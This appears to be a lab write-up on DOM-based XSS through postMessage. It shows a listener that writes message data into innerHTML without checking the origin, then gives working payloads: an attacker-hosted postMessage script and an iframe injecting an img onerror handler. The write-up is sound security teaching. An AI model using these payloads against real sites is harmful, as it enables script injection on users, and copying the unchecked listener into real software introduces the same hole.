### DOM XSS using web messages
**Objective**: This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.<br>
Below is the snippet code we found in application home page while trying to view using View Page source.
```html
<!-- Ads to be inserted here -->
<div id='ads'>
</div>
<script>
    window.addEventListener('message', function(e) {
      document.getElementById('ads').innerHTML = e.data;
  })
</script>
```
#### Problems Identified
1. The message event listener triggers whenever any script on any webpage sends a message to your window using postMessage(). Because the code doesn't check e.origin to verify who sent the message, an attacker can host a malicious website, open your site in an iframe (or a popup), and blast harmful data straight into your listener.
2.  The code uses .innerHTML to insert e.data directly into the webpage. innerHTML doesn't just render text; it parses and executes HTML and JavaScript.<br>
Host the below script on attacker server to have XSS.
```
// The attacker opens your vulnerable site
const targetWindow = window.open("https://your-vulnerable-site.com");
// The attacker sends a malicious payload disguised as data
targetWindow.postMessage("<img src=x onerror=alert('Hacked!')>", "*");
```
Use the below one to solve the lab.
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
When the iframe loads, the postMessage() method sends a web message to the home page. The event listener, which is intended to serve ads, takes the content of the web message and inserts it into the div with the ID ads. 
